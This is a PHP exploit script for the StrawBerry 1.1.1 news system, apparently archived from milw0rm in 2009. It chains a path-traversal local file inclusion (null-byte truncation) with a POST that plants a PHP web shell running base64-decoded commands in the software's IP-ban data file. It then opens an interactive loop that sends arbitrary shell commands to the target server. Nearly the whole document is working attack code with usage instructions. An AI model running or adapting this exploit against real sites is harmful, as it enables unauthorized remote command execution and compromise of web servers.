<html><head><title>StrawBerry 1.1.1 LFI / Remote Command Execution Exploit</title></head><pre>&lt;?php

/*********************************************************************
 * StrawBerry 1.1.1 LFI / Remote Command Execution Exploit           *
 * Site: http://strawberry.goodgirl.ru/                              *
 *********************************************************************
 * magic_quotes_gpc = Off                                            *
 *********************************************************************
 * Author: [AVT]                                                     *
 * Date : 10.05.09                                                   *
 * My Site: http://antichat.ru/                                      *
 *********************************************************************/
set_time_limit(0);
error_reporting(0);
list($cli,$host,$path) = $argv;

if ($argc != 3) {  
    
    print &quot;\no-------------------------------------------------------------o\n&quot;;
    print &quot;\r|   StrawBerry 1.1.1 LFI / Remote Command Execution Exploit   |\n&quot;;
    print &quot;\r|           Site: http://strawberry.goodgirl.ru/              |\n&quot;;
    print &quot;\ro-------------------------------------------------------------o\n&quot;;
    print &quot;\r| Author: [AVT]                                               |\n&quot;;
    print &quot;\r| My Site: http://antichat.ru/                                |\n&quot;;
    print &quot;\ro-------------------------------------------------------------o\n&quot;;
    print &quot;\r| Usage:   php expl.php [host] [path]                         |\n&quot;;
    print &quot;\r| host     localhost                                          |\n&quot;;
    print &quot;\r| path     /news/                                             |\n&quot;;
    print &quot;\r| Example: php expl.php site.com /news/                       |\n&quot;;
    print &quot;\ro-------------------------------------------------------------o\n&quot;;
    exit;      
}         
if (check_host ())
	{
	post_shell();
	}
use_shell();

function check_host ()
	{
	global $host,$path;
	$data = &quot;GET {$path}example/index.php?do=../../../../db/base/ipban.MYD%00 HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: $host\r\n&quot;;
	$data .= &quot;Connection: close\r\n\r\n&quot;;
	$html = send ($host,$data);
    	if (!stristr($html,'a:')) 
		{
		print &quot;\ro-------------------------------------------------------------o\n&quot;;
		print &quot;\r| Exploit Failed!                                             |\n&quot;;
		print &quot;\ro-------------------------------------------------------------o\n&quot;;
		exit;
    		}
	elseif (stristr($html,'&lt;code&gt;'))
		{
		return false;
    		}
	else
		{
		return true;
		}
	}


function send ($host,$data) 
	{
	if (!$sock = @fsockopen($host,80)) 
		{
		die(&quot;Connection refused, try again!\n&quot;);
    		}   	
	fputs($sock,$data);
	while (!feof($sock)) { $html .= fgets($sock); }
	fclose($sock);
	return $html;
	}

function post_shell() 
	{
	global $host,$path;
	$post  = &quot;add_ip=&quot; . urlencode('&lt;code&gt;&lt;?php passthru(base64_decode($_GET[cmd]));?&gt;&lt;/code&gt;') . &quot;&amp;action=add&amp;mod=ipban&quot;;
	$data .= &quot;POST {$path}example/index.php?do=../../../../../inc/mod/ipban.mdu%00 HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: $host\r\n&quot;;
	$data .= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;
	$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
	$data .= &quot;Content-Length: &quot;.strlen($post).&quot;\r\n\r\n&quot;;
	$data .= &quot;$post\r\n\r\n&quot;;
	send ($host,$data);
	}


function use_shell()
	{
    	while (1) 
		{
        	echo &quot;[Shell]~$: &quot;; 
        	$cmd = stripslashes(trim(fgets(STDIN)));  
        	if (preg_match('/^(exit|--exit|quit|--quit)$/i',$cmd)) die(&quot;\nExited\n&quot;);
        	print exec_cmd($cmd);     
		}
	}


function exec_cmd($cmd) 
	{
	global $host,$path;

	$cmd = base64_encode($cmd);
	$data .= &quot;GET {$path}example/index.php?cmd={$cmd}&amp;do=../../../../db/base/ipban.MYD%00 HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: $host\r\n&quot;;
	$data .= &quot;Connection: close\r\n\r\n&quot;;
	$html = send ($host,$data);
	preg_match_all('/&lt;code&gt;(.*)&lt;\/code&gt;/si', $html, $match);
	return $match[1][0];
	}

?&gt;

# milw0rm.com [2009-05-14]</pre></html>